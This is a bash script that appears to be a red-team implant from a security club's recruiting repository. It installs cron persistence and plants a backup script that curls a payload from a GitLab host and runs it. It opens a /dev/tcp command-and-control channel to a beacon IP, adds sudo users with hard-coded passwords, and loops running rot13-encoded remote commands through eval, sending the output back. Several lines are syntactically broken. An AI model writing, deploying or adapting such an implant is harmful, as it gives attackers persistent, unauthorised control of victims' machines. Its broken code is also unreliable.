#!/bin/bash

# Check for mandatory beacon IP address argument
if [ -z "$1" ]; then
  echo "Usage: $0 <beaconIPAddress>"
  exit 1
fi

beaconIPAddress="$1"

# Create a startup task using crontab for persistence (runs at boot)
cronjob="@reboot /etc/javalanche.sh"
(crontab -l ; echo "$cronjob") | crontab -

# Create a backup script to ensure the main payload is downloaded if deleted
backup_dir="/bin/Webkinz"
main_payload="/etc/linuxPayload.sh"
backup_script="$backup_dir/backup.sh"

# Ensure the backup directory exists
if [ ! -d "$backup_dir" ]; then
  sudo mkdir -p "$backup_dir"
fi

# Create the backup script
if [ ! -f "$backup_script" ]; then
  sudo cat << EOF > "$backup_script"
#!/bin/bash
if [ ! -f "$main_payload" ]; then
  sudo curl -o "$main_payload" "http://gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/linuxPayload.sh"
  sudo chmod +x "$main_payload"
  sudo nohup bash "$main_payload" -BeaconIPAddress "$beaconIPAddress" &
fi
EOF
  sudo chmod +x "$backup_script"
fi

# Set up a cron job to run the backup script every 5 minutes
cronjob="*/5 * * * * $backup_script"
(crontab -l ; echo "$cronjob") | crontab -

# Add fiewall rules
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Create TCP connection to the server
exec 3<>/dev/tcp/$beaconIPAddress/80

# Send initial message to C2
echo "Linux" >&3

# Add users
for user in "Jimithy:Password-123456" "Doug:Password-12345"; do
  username=$(echo "$user" | cut -d':' -f1)
  password=$(echo "$user" | cut -d':' -f2)
  
  if ! id -u $username >/dev/null 2>&1; then
    sudo useradd $username
    sudo echo "$username:$password" | chpasswd
    usermod -aG sudo $username
  fi
done

rot13() {
  echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
}

# Check every minute if users exist and create them if necessary
while true; do
  # Read command from the C2
  if read -t 1 command <&3; then
    if [ !("$command" != "HTTP/1.1 200 OK") && !("$command" == "Content-Length"*) && !("$command" == "Content-Type: text/plain; charset=utf-8") && !("$command" == "") ]; then
      $command = rot13 $command
      sudo eval "$command" > /tmp/c2_output.txt 2>&1
      cat /tmp/c2_output.txt >&3'
    fi
  fi
done
